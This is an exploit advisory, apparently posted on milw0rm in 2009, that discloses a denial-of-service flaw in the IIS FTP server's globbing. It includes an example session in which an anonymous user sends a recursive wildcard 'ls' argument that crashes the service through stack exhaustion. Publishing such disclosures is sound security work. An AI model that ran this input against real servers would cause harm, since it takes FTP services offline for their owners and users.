@@ -1,0 +1,47 @@
+***** MS IIS FTPD DoS ZER0DAY *****
+
+There is a DoS vulnerability in the globbing functionality of IIS FTPD.
+Anonymous users can exploit this if they have read access to a directory!!!
+Normal users can exploit this too if they can read a directory.
+
+Example session where the anonymous user has read access to the folder "pub":
+
+C:\Users\Nikolaos>ftp 192.168.2.102
+Verbindung mit 192.168.2.102 wurde hergestellt.
+220 Microsoft FTP Service
+Benutzer (192.168.2.102:(none)): ftp
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Kennwort:
+230 Anonymous user logged in.
+ftp> ls "-R p*/../"
+...
+p*/../pub:
+pub
+...
+p*/../pub:
+pub
+...
+p*/../pub:
+pub
+...
+p*/../pub:
+pub
+...
+Verbindung beendet durch Remotehost. (MEANS: Remote Host has closed
+the connection)
+ftp>
+ftp>
+
+By looking into my debugging session with OllyDbg I see that an
+exception is raised and
+the ftp service crashes due to a "stack overflow", what is a stack exhaustion.
+If the ftp service is set to "manual" startup in services control
+manager the service
+needs to be restarted manually.
+IIS 5.0 and 6.0 were tested and are affected.
+
+Best Regards,
+
+Nikolaos Rangos
+
+# milw0rm.com [2009-09-04]
